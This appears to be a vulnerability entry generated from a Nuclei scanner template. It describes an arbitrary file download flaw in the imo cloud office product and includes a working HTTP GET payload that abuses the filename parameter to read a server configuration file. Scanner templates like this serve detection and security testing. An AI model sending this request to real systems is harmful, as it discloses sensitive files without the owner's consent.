# Nuclei Template: IMO - Arbitrary File Download
**Template ID:** imo-file-download
**Vulnerability Class:** Information Disclosure
**Severity:** High
**CWE:** CWE-200
**Source:** Nuclei Template (`imo-file-download.yaml`)

## Vulnerability Information & PoC

## Description
The imo cloud office can read system sensitive files because the filename parameter of the /file/Placard/upload/Imo_DownLoadUI.php page is not strictly filtered.

## Steps to reproduce / Exploit Payload
```http
GET /file/Placard/upload/Imo_DownLoadUI.php?cid=1&uid=1&type=1&filename=/OpenPlatform/config/kdBind.php HTTP/1.1
Host: {{Hostname}}
```

## References
- https://forum.butian.net/article/214
